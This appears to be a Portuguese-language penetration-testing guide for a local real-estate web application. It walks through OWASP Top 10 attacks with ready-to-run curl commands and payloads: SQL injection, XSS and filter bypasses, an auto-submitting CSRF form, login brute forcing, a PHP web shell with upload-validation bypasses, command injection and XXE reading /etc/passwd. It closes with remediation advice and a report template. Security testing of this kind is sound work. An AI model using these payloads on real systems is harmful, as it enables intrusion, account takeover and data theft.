# 🔓 GUIA COMPLETO DE TESTES DE PENETRAÇÃO (PenTest)
## Sistema ZAP - Imobiliário

**Objetivo**: Invadir o sistema, identificar vulnerabilidades e testar segurança  
**Princípio Fundamental**: "Nunca confie no front-end"

---

## 📋 TABLA DE CONTEÚDOS

1. [Reconhecimento](#reconhecimento)
2. [Análise de Vulnerabilidades OWASP](#vulnerabilidades-owasp)
3. [Testes de Penetração Manual](#testes-manuais)
4. [Ferramentas Recomendadas](#ferramentas)
5. [Relatório de Achados](#relatorio)

---

## <a name="reconhecimento"></a>🔍 1. RECONHECIMENTO

### 1.1 Mapping de Endpoints

```bash
# Usar ZAP, Burp Suite ou curl para descobrir endpoints
curl -v http://localhost:8080/api/v1/ 2>&1 | head -20

# OpenAPI documentation
curl http://localhost:8080/openapi.json

# Verificar documentação de API
curl http://localhost:8080/api_docs.md
```

### 1.2 Identificar Tecnologia Stack

```bash
# Verificar headers HTTP
curl -I http://localhost:8080/

# Esperado: Server: CodeIgniter 4, PHP version, etc

# Procurar por arquivo de configuração/info
curl http://localhost:8080/phpinfo.php  # ❌ NUNCA em produção
```

### 1.3 Enumerar Usuários

```bash
# Testar endpoints de login
for email in admin@test.com user@test.com test@example.com; do
    curl -X POST http://localhost:8080/auth/login \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$email\",\"password\":\"wrong\"}" \
        2>/dev/null | grep -q "not found" && echo "User $email not found" || echo "User $email might exist"
done

# Testar timing differences (timing attack)
curl -X POST http://localhost:8080/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"valid@example.com","password":"wrong"}' \
    -w "Time: %{time_total}\n"
```

---

## <a name="vulnerabilidades-owasp"></a>⚠️ 2. ANÁLISE DE VULNERABILIDADES OWASP TOP 10

### 🔴 2.1 SQL INJECTION

#### Testes Básicos:

```bash
# Teste 1: String com aspas
curl "http://localhost:8080/api/v1/properties?title=Casa%27%20OR%20%271%27=%271"

# Teste 2: Comentário SQL
curl "http://localhost:8080/api/v1/properties?id=1--"

# Teste 3: UNION-based
curl "http://localhost:8080/api/v1/properties?id=1%20UNION%20SELECT%20username,password%20FROM%20users--"

# Teste 4: Time-based blind
curl "http://localhost:8080/api/v1/properties?id=1%20AND%20SLEEP(5)--"

# Teste 5: Error-based
curl "http://localhost:8080/api/v1/properties?id=extractvalue(0x0a,concat(0x7e,(SELECT%20version()),0x7e))--"
```

#### Usando Burp Suite/OWASP ZAP:

```
1. Interceptar request
2. Enviar para Scanner
3. Verificar Output:
   - Status: High Risk
   - Tipo: SQL Injection
   - Payload: ' OR '1'='1
```

#### Verificação de Parametrização:

```php
// ❌ VULNERÁVEL
$results = $db->query("SELECT * FROM properties WHERE title LIKE '%$search%'");

// ✅ SEGURO
$results = $db->table('properties')
    ->like('title', $search)
    ->get()
    ->getResult();
```

---

### 🔴 2.2 XSS (CROSS-SITE SCRIPTING)

#### Stored XSS:

```bash
# Injetar payload no título
curl -X POST http://localhost:8080/api/v1/properties \
  -H "Content-Type: application/json" \
  -H "X-API-Key: test_key" \
  -d '{
    "title": "<script>alert(\"XSS\")</script>Casa Bonita",
    "description": "Test property",
    "price": 100000
  }'

# Verificar se script é executado quando propriedade é visualizada
curl http://localhost:8080/api/v1/properties | grep -o "<script>alert"
```

#### Reflected XSS:

```bash
# Via query parameter
curl "http://localhost:8080/imoveis?search=<script>alert(document.cookie)</script>"

# Via Search API
curl "http://localhost:8080/api/v1/properties?filter=<img%20src=x%20onerror=alert(1)>"
```

#### DOM-based XSS:

```javascript
// No console do navegador
fetch('/api/v1/properties')
    .then(r => r.json())
    .then(d => {
        // Se o código faz: document.body.innerHTML = d.data[0].title
        // E title contém <img onerror=alert(1)>, XSS executará
    });
```

#### Bypass de Filtros:

```bash
# Diferentes encoding
# URL Encoding
<script> = %3Cscript%3E

# HTML Entity
< = &lt;
> = &gt;

# Teste com bypass
curl "http://localhost:8080/api/v1/properties?title=&lt;img%20src=x%20onerror=alert(1)&gt;"

# Mixed case
<ScRiPt>alert(1)</sCrIpT>

# With attributes
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
```

---

### 🔴 2.3 CSRF (CROSS-SITE REQUEST FORGERY)

#### Teste de Ausência de CSRF Token:

```html
<!-- Colocar em servidor externo -->
<html>
<body>
<form action="http://localhost:8080/admin/properties/1" method="POST">
    <input type="hidden" name="title" value="Hacked Property" />
    <input type="hidden" name="price" value="1" />
    <input type="submit" value="Click here">
</form>

<script>
document.forms[0].submit(); // Auto-submit
</script>
</body>
</html>

<!-- Se a propriedade foi alterada, CSRF token ausente! -->
```

#### Teste de CSRF Token Fraco:

```bash
# Obter CSRF token
TOKEN=$(curl -s http://localhost:8080/admin/properties | grep csrf | head -1 | sed 's/.*value="\([^"]*\)".*/\1/')

# Reusar token
curl -X POST http://localhost:8080/admin/properties/2 \
  -d "csrf_token=$TOKEN&title=Different%20Property"

# Se aceitar, token é reutilizável (vulnerável)
```

---

### 🔴 2.4 AUTENTICAÇÃO FRACA

#### Bypass de Login:

```bash
# SQL Injection no login
curl -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@test.com\x27 OR \x271\x27=\x271",
    "password": "anything"
  }'

# Credential Stuffing
for password in password123 admin123 12345678 password; do
    curl -X POST http://localhost:8080/auth/login \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"admin@test.com\",\"password\":\"$password\"}" \
      -s | grep -q "success" && echo "Found: $password"
done

# Brute Force (sem rate limiting)
for i in {1..10000}; do
    curl -X POST http://localhost:8080/auth/login \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"admin@test.com\",\"password\":\"attempt$i\"}" \
      -s | grep -q "success" && echo "Found: attempt$i" && break
done
```

#### Enumeração de Usuários:

```bash
# Response timing attack
time curl -X POST http://localhost:8080/auth/login \
  -d "email=admin@example.com&password=wrong"

time curl -X POST http://localhost:8080/auth/login \
  -d "email=nonexistent@example.com&password=wrong"

# Se uma é mais lenta, usuário foi encontrado no BD
```

#### Bypass de 2FA:

```bash
# Se 2FA mal implementada
curl -X POST http://localhost:8080/auth/verify-2fa \
  -H "Content-Type: application/json" \
  -d '{"code": "000000"}'  # Tenta código padrão

# Burp Intruder com números 0-999999
# Se algum funciona, 2FA é fraco
```

---

### 🔴 2.5 AUTORIZAÇÃO/CONTROLE DE ACESSO

#### IDOR (Insecure Direct Object Reference):

```bash
# Usuário A tenta ver dados de Usuário B
curl -H "Authorization: Bearer token_user_a" \
  http://localhost:8080/api/v1/properties/999

# 999 é ID de propriedade de outro usuário
# Se retorna dados, é IDOR!

# Testes sistemáticos
for id in {1..100}; do
    curl -s -H "Authorization: Bearer token_user_a" \
      http://localhost:8080/api/v1/accounts/$id | grep -q "email" && \
      echo "Acesso a account $id concedido!"
done
```

#### Privilege Escalation:

```bash
# Usuário comum tenta se tornar admin
curl -X PUT http://localhost:8080/api/v1/users/me \
  -H "Authorization: Bearer token_user" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# Tentar modificar ID do usuário
curl -X PUT http://localhost:8080/api/v1/users/123456 \
  -H "Authorization: Bearer token_user" \
  -H "Content-Type: application/json" \
  -d '{"email": "hacker@example.com"}'

# Se aceitar, há controle de acesso fraco
```

#### Mass Assignment:

```bash
# Tentar modificar campo não autorizado
curl -X POST http://localhost:8080/api/v1/properties \
  -H "Authorization: Bearer token_user" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Casa",
    "price": 100000,
    "featured": true,  # Campo admin?
    "is_premium": true,  # Campo admin?
    "verified": true  # Campo admin?
  }'

# Se aceitar, há mass assignment vulnerability
```

---

### 🔴 2.6 FILE UPLOAD VULNERABILITIES

#### Upload de Arquivo Executável:

```bash
# Payload: Shell PHP
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

curl -F "file=@shell.php" \
  -H "Authorization: Bearer token" \
  http://localhost:8080/api/v1/properties/1/media

# Tentar acessar
curl http://localhost:8080/uploads/shell.php?cmd=whoami
```

#### Bypass de Validação:

```bash
# Mudar extensão
cp shell.php shell.php.jpg
curl -F "file=@shell.php.jpg" \
  http://localhost:8080/api/v1/properties/1/media

# Adicionar magic bytes
echo -ne '\xFF\xD8\xFF\xE0' | cat - shell.php > shell.jpg
curl -F "file=@shell.jpg" \
  http://localhost:8080/api/v1/properties/1/media

# Double extension
tar czf shell.php.tar.gz shell.php
curl -F "file=@shell.php.tar.gz" \
  http://localhost:8080/api/v1/properties/1/media

# Null byte injection (PHP < 5.3)
mv shell.php shell.php%00.jpg
curl -F "file=@shell.php%00.jpg" \
  http://localhost:8080/api/v1/properties/1/media
```

#### Path Traversal em Upload:

```bash
# Tentar escrever fora da pasta uploads
curl -X POST http://localhost:8080/api/v1/properties/1/media \
  -F "file=@test.jpg" \
  -F "path=../../../../etc/config.php" \
  -H "Authorization: Bearer token"
```

---

### 🔴 2.7 INJEÇÃO - outros tipos

#### Command Injection:

```bash
# Se há processamento de imagem (ImageMagick, GhostScript)
curl -X POST http://localhost:8080/api/v1/properties/1/media \
  -F "file=@test.jpg" \
  -F "action=convert $(whoami > /tmp/pwned)" \
  -H "Authorization: Bearer token"

# Verificar
curl http://localhost:8080/tmp/pwned
```

#### LDAP Injection:

```bash
# Se use LDAP para autenticação
curl -X POST http://localhost:8080/auth/login \
  -d "email=*&password=*" \
  # LDAP query: admin=* sempre retorna true
```

#### XML External Entity (XXE):

```bash
# Se aceita XML
cat > xxe.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<properties>
  <title>&xxe;</title>
</properties>
EOF

curl -X POST http://localhost:8080/api/v1/properties \
  -H "Content-Type: application/xml" \
  -d @xxe.xml \
  -H "Authorization: Bearer token"
```

---

### 🔴 2.8 INSECURE DESERIALIZATION

#### PHP Deserialization:

```php
// Se o código faz algo como:
$data = unserialize($_POST['data']);

// Pode levar a RCE se classes maliciosas existem
```

```bash
# Usar phpggc para gerar payload
php -r 'echo urlencode(serialize(["cmd" => "whoami"]));'

curl -X POST http://localhost:8080/api/v1/process \
  -d "data=O:4:%22Test%22:1:{s:3:%22cmd%22;s:6:%22whoami%22;}"
```

---

### 🔴 2.9 BROKEN AUTHENTICATION - Session Fixation

```bash
# Obter session ID
curl -v http://localhost:8080/admin -c cookies.txt

# Tentar reutilizar
curl -b "PHPSESSID=known_session_id" http://localhost:8080/admin

# Se funciona, session fixation é possível
```

---

### 🔴 2.10 API KEY EXPOSURE

```bash
# Buscar chaves em repositório
grep -r "api_key" /path/to/repo

# Procurar em arquivos
grep -r "X-API-Key" /path/to/repo
grep -r "Bearer" /path/to/repo

# Verificar se API Keys estão em .env (exposto?)
curl http://localhost:8080/.env

# Procurar em histórico git
git log -p | grep "api_key"
git log --all --source --remotes -S "api_key"
```

---

## <a name="testes-manuais"></a>✅ 3. TESTES DE PENETRAÇÃO MANUAL

### 3.1 Teste de Validação de Entrada

```bash
#!/bin/bash

echo "=== Teste de Validação de Email ==="
for email in "notanemail" "test@" "@example.com" "test..test@example.com" "test@example"; do
    echo -n "Email: $email -> "
    curl -X POST http://localhost:8080/api/v1/accounts \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$email\",\"password\":\"test123\",\"name\":\"Test\"}" \
        -s | grep -q "error" && echo "❌ Rejeitado (Correto)" || echo "✅ Aceito (Vulnerável!)"
done

echo ""
echo "=== Teste de Validação de Números ==="
for value in "-100000" "abc" "999999999999" ""; do
    echo -n "Preço: $value -> "
    curl -X POST http://localhost:8080/api/v1/properties \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer token" \
        -d "{\"title\":\"Test\",\"price\":$value}" \
        -s | grep -q "error" && echo "❌ Rejeitado (Correto)" || echo "✅ Aceito (Verificar)"
done
```

### 3.2 Teste de Rate Limiting

```bash
#!/bin/bash

echo "Testando rate limiting em /auth/login"
for i in {1..50}; do
    response=$(curl -s -X POST http://localhost:8080/auth/login \
        -d "email=test@example.com&password=wrong$i" \
        -w "%{http_code}")
    
    code=${response: -3}
    echo "Tentativa $i: HTTP $code"
    
    if [ $code -eq 429 ]; then
        echo "✅ Rate limiting ativado após $i tentativas"
        exit 0
    fi
done

echo "❌ Sem rate limiting detectado"
```

### 3.3 Teste de Session Management

```bash
#!/bin/bash

# Obter session
SESSION1=$(curl -s -c - http://localhost:8080/admin | grep PHPSESSID | awk '{print $7}')

# Esperar
sleep 60

# Tentar reutilizar
STATUS=$(curl -s -b "PHPSESSID=$SESSION1" http://localhost:8080/admin -w "%{http_code}")

if [ $STATUS -eq 200 ]; then
    echo "❌ Session não expirou (Verificar timeout)"
else
    echo "✅ Session expirou corretamente"
fi
```

### 3.4 Teste de Logout

```bash
#!/bin/bash

# Login
TOKEN=$(curl -s -X POST http://localhost:8080/auth/login \
    -d "email=test@example.com&password=password123" | jq -r '.token')

# Tentar requisição autenticada
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/v1/user | grep -q "email" && \
    echo "✅ Logado com sucesso"

# Logout
curl -s -X POST -H "Authorization: Bearer $TOKEN" http://localhost:8080/auth/logout

# Tentar usar token antigo
RESPONSE=$(curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/v1/user)
echo $RESPONSE | grep -q "unauthorized" && \
    echo "✅ Token invalidado após logout" || \
    echo "❌ Token ainda válido após logout (Vulnerável!)"
```

---

## <a name="ferramentas"></a>🛠️ 4. FERRAMENTAS RECOMENDADAS

### 4.1 Ferramentas de Segurança

```bash
# OWASP ZAP
brew install owasp-zap
zaproxy &
# http://localhost:8080 config

# Burp Suite Community
# https://portswigger.net/burp/communitydownload

# SQLMap (SQL Injection)
pip install sqlmap
sqlmap -u "http://localhost:8080/api/v1/properties?id=1" --dbs

# OWASP Juice Shop (para treino)
docker run -p 3000:3000 bkimminich/juice-shop

# WPScan (WordPress - se aplicável)
gem install wpscan
wpscan --url http://localhost:8080 --detection-mode aggressive

# Nikto (Web Scanner)
nikto -h http://localhost:8080

# Nessus (Vulnerability Scanner)
# https://www.tenable.com/products/nessus

# OWASP Dependency-Check
dependency-check --scan /path/to/project
```

### 4.2 Ferramentas de API Testing

```bash
# Postman
brew install postman

# REST Client VSCode Extension
# id: humao.rest-client

# HTTPie
brew install httpie
http POST localhost:8080/api/v1/properties

# Insomnia
brew install insomnia
```

### 4.3 Ferramentas de Network

```bash
# Wireshark
brew install wireshark

# Charles Proxy
# https://www.charlesproxy.com/

# mitmproxy
pip install mitmproxy
mitmproxy -p 8000
```

---

## <a name="relatorio"></a>📊 5. RELATÓRIO DE ACHADOS

### Template de Report:

```markdown
# PENETRATION TEST REPORT
## Sistema: ZAP Imobiliário

### EXECUTIVE SUMMARY
- **Data**: [DATE]
- **Testadores**: [NAMES]
- **Escopo**: API v1, Admin Panel, Web Frontend
- **Classificação Risk**: [CRÍTICO/ALTO/MÉDIO/BAIXO]

### VULNERABILIDADES ENCONTRADAS

#### 1. SQL Injection em Search (CRÍTICO)
- **Localização**: `/api/v1/properties?search=`
- **Payload**: `' OR '1'='1`
- **Impacto**: Acesso não autorizado a dados, deleção de BD
- **Recomendação**: Usar parametrized queries
- **Status**: [NÃO CORRIGIDO/CORRIGIDO]

#### 2. XSS no Título da Propriedade (ALTO)
- **Localização**: `/api/v1/properties POST`
- **Payload**: `<img src=x onerror=alert(1)>`
- **Impacto**: Roubo de cookies/tokens
- **Recomendação**: Escapar output, usar Content-Security-Policy
- **Status**: [NÃO CORRIGIDO/CORRIGIDO]

[... mais vulnerabilidades ...]

### STATÍSTICAS

| Severidade | Quantidade |
|-----------|-----------|
| CRÍTICO   | 2         |
| ALTO      | 5         |
| MÉDIO     | 8         |
| BAIXO     | 12        |
| TOTAL     | 27        |

### RECOMENDAÇÕES

1. Implementar Web Application Firewall (WAF)
2. Usar OWASP Top 10 Checklist
3. Testes de segurança automáticos em CI/CD
4. Code review focalizado em segurança
5. Treinamento de segurança para devs

### PRÓXIMOS PASSOS

- [ ] Corrigir vulnerabilidades CRÍTICAS
- [ ] Testar novamente
- [ ] Implementar monitoramento
- [ ] Plano de remediação
```

---

## 🎯 RESUMO DE ATAQUES PRINCIPAIS

| Técnica | Comando | Verificação |
|---------|---------|-------------|
| **SQL Injection** | `' OR '1'='1` | `grep -o "error"` |
| **XSS** | `<script>alert(1)</script>` | Executado no browser |
| **CSRF** | POST sem token | Alteração confirmada |
| **IDOR** | Mudar ID na URL | Acesso a outro usuário |
| **Auth Bypass** | SQL no login | Logado como admin |
| **File Upload** | PHP shell | RCE confirmado |
| **Rate Limit** | 100 requests | 429 HTTP code |

---

## ✅ CHECKLIST PÓS-TESTE

- [ ] Todas as vulnerabilidades documentadas
- [ ] Provas (screenshots/logs) coletadas
- [ ] Gravidade classificada
- [ ] Recomendações claras
- [ ] Timeline de remediação acordada
- [ ] Testes de regressão agendados
- [ ] Relatório enviado ao cliente

**Lembre-se**: "Trust nothing that comes from the client-side"
